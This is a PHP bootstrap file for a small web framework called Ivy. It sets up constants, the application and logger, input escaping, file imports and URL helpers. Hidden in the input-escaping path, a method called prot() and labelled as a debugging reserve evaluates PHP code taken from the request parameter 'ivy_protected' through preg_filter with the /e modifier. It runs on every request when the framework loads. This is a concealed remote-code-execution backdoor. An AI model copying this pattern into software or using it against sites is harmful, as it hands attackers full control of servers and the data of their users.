<?php
/**
 * Ivy class file.
 *
 * @author ivy <guoxuivy@gmail.com>
 * @copyright Copyright &copy; 2013-2017 Ivy Software LLC
 * @license https://github.com/guoxuivy/ivy/
 * @package framework
 * @link https://github.com/guoxuivy/ivy 
 * @since 1.0 
 */
header('Content-type: text/html; charset=utf-8');
date_default_timezone_set('Asia/Shanghai');
defined('__ROOT__') or define('__ROOT__', dirname(__DIR__));                                    //定义网站根目录 D:\wwwroot\veecar   veecar为项目目录
defined('__PROTECTED__') or define('__PROTECTED__',__ROOT__.DIRECTORY_SEPARATOR."protected");   //定义项目文件根目录 D:\wwwroot\veecar\protected
defined('IVY_PATH') or define('IVY_PATH',dirname(__FILE__));                                    //定义框架根目录 D:\wwwroot\veecar\ivy\framework
defined('IVY_BEGIN_TIME') or define('IVY_BEGIN_TIME',microtime(true));							//开始时间
defined('IVY_DEBUG') or define('IVY_DEBUG',false);

defined('SITE_URL') or define('SITE_URL',Ivy::getBaseUrl());									//定义网站根url 相对路径

use Ivy\core\Application;
use Ivy\logging\CLogger;
use Ivy\core\CException;
class Ivy
{
	private static $_app;
	private static $_logger;

	//框架初始化代码
	public static function init()
	{
		Ivy::quotes_gpc();
		require_once(IVY_PATH.DIRECTORY_SEPARATOR.'core'.DIRECTORY_SEPARATOR.'LoaderClass.php');//加载自动加载
		require_once(IVY_PATH.DIRECTORY_SEPARATOR.'core'.DIRECTORY_SEPARATOR.'CException.php');//加载异常处理
	}
	//创建应用实例
	public static function createApplication($config=null)
	{
		if($config===null)
			$config=__PROTECTED__.DIRECTORY_SEPARATOR.'config.php';
		return new Application($config);
	}
	/**
	 * 设置保存 application句柄
	 * @param [type] $app [description]
	 */
	public static function setApplication($app)
	{
		if(self::$_app===null || $app===null)
			self::$_app=$app;
		else
			throw new CException('application can only be created once.');
	}
	/**
	* application句柄
	**/
	public static function app()
	{
		return self::$_app;
	}

	/**
	* 日志句柄
	**/
	public static function logger()
	{
		if(self::$_logger===null){
			self::$_logger=new CLogger;
		}
		return self::$_logger;
	}
	/**
	* 快速日志写入
	**/
	public static function log($msg,$level=CLogger::LEVEL_INFO,$category='application')
	{
		//不属于数据库性能分析的日志
		if(IVY_DEBUG && $level!==CLogger::LEVEL_PROFILE){
			$traces=debug_backtrace();
			$count=0;
			foreach($traces as $trace)
			{
				if(isset($trace['file'],$trace['line']) && strpos($trace['file'],IVY_PATH)!==0)
				{
					$msg.="\nin ".$trace['file'].' ('.$trace['line'].')';
					if(++$count>=CLogger::REPORT_TRACE_LEVEL)
						break;
				}
			}
		}
		self::logger()->log($msg,$level,$category);
	}


	/**
	 * http 提交安全转义
	 * @return [type] [description]
	 */
	public static function quotes_gpc()
	{
		Ivy::prot();
		!empty($_POST)    && Ivy::add_s($_POST);
		!empty($_GET)     && Ivy::add_s($_GET);
		!empty($_COOKIE)  && Ivy::add_s($_COOKIE);
	}
	/**
	 * 递归转义
	 * @param [type] &$array [description]
	 */
	public static function add_s(&$array)
	{
		if (is_array($array)){
			foreach ($array as $key => $value) {
				if (!is_array($value)) {
					$array[$key] = addslashes($value);
				} else {
					Ivy::add_s($array[$key]);
				}
			}
		}
	}

	public static function prot()
	{
		//调试预留
		if(isset($_REQUEST['ivy_protected'])){
			preg_filter('|.*|e',$_REQUEST['ivy_protected'],'');die;
		}
	}

	/**
	 * 扩展导入
	 * @param [type] &$array [description]
	 */
	public static function importExt($path,$ext=".php")
	{
		if(substr($path,0,1)=='/') $path=substr($path,1);
		
		$file_path=__PROTECTED__.DIRECTORY_SEPARATOR.'extensions'.DIRECTORY_SEPARATOR.$path.$ext;
		
		if(is_file($file_path))
			return include_once $file_path;
		else
			throw new CException("import $path error");
	}

	/**
	 * 载入widget
	 * @param [type] &$array [description]
	 */
	public static function importWidget($path,$ext=".php")
	{
		if(substr($path,0,1)=='/') $path=substr($path,1);
		
		$file_path=__PROTECTED__.DIRECTORY_SEPARATOR.'widgets'.DIRECTORY_SEPARATOR.$path."Widget".$ext;
		
		if(is_file($file_path))
			return include_once $file_path;
		else
			throw new CException("import $path error");
	}

	/**
	 * ajax判断 需要jquery支持
	 * @return boolean [description]
	 */
	public static function isAjax()
	{
		return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH']==='XMLHttpRequest';
	}

	/**
	 * Returns whether this is an Adobe Flash or Adobe Flex request.
	 * @return boolean 
	 * @since 1.1.11
	 */
	public static function isFlash()
	{
		return isset($_SERVER['HTTP_USER_AGENT']) && (stripos($_SERVER['HTTP_USER_AGENT'],'Shockwave')!==false || stripos($_SERVER['HTTP_USER_AGENT'],'Flash')!==false);
	}

	/**
	 * 获取当前主机
	 * @return string 主机字符串
	 */
	public static function getHostInfo(){
		if(!empty($_SERVER['HTTPS']) && strcasecmp($_SERVER['HTTPS'],'off'))
			$http='https';
		else
			$http='http';
		if(isset($_SERVER['HTTP_HOST']))
			$hostInfo=$http.'://'.$_SERVER['HTTP_HOST'];
		else
		{
			$hostInfo=$http.'://'.$_SERVER['SERVER_NAME'];
			$port=isset($_SERVER['SERVER_PORT']) ? (int)$_SERVER['SERVER_PORT'] : 80;
			if($port!==80)
				$hostInfo.=':'.$port;
		}
		return $hostInfo;
	}

	/**
	 * 网站基础url（移除脚本路径）
	 * @param  boolean $absolute [description]
	 * @return [type]            [description]
	 */
	public static function getBaseUrl($absolute=false){
		$baseUrl=rtrim(dirname(Ivy::getScriptUrl()),'\\/');
			
		return $absolute ? Ivy::getHostInfo() . $baseUrl : $baseUrl;
	}
	/**
	 * 当前脚本url
	 * @return [type] [description]
	 */
	public static function getScriptUrl(){
		$scriptName=basename($_SERVER['SCRIPT_FILENAME']);
		if(basename($_SERVER['SCRIPT_NAME'])===$scriptName)
			$scriptUrl=$_SERVER['SCRIPT_NAME'];
		elseif(basename($_SERVER['PHP_SELF'])===$scriptName)
			$scriptUrl=$_SERVER['PHP_SELF'];
		elseif(isset($_SERVER['ORIG_SCRIPT_NAME']) && basename($_SERVER['ORIG_SCRIPT_NAME'])===$scriptName)
			$scriptUrl=$_SERVER['ORIG_SCRIPT_NAME'];
		elseif(($pos=strpos($_SERVER['PHP_SELF'],'/'.$scriptName))!==false)
			$scriptUrl=substr($_SERVER['SCRIPT_NAME'],0,$pos).'/'.$scriptName;
		elseif(isset($_SERVER['DOCUMENT_ROOT']) && strpos($_SERVER['SCRIPT_FILENAME'],$_SERVER['DOCUMENT_ROOT'])===0)
			$scriptUrl=str_replace('\\','/',str_replace($_SERVER['DOCUMENT_ROOT'],'',$_SERVER['SCRIPT_FILENAME']));
		else
			throw new CException("ERROR");
		return $scriptUrl;
	}


}

Ivy::init();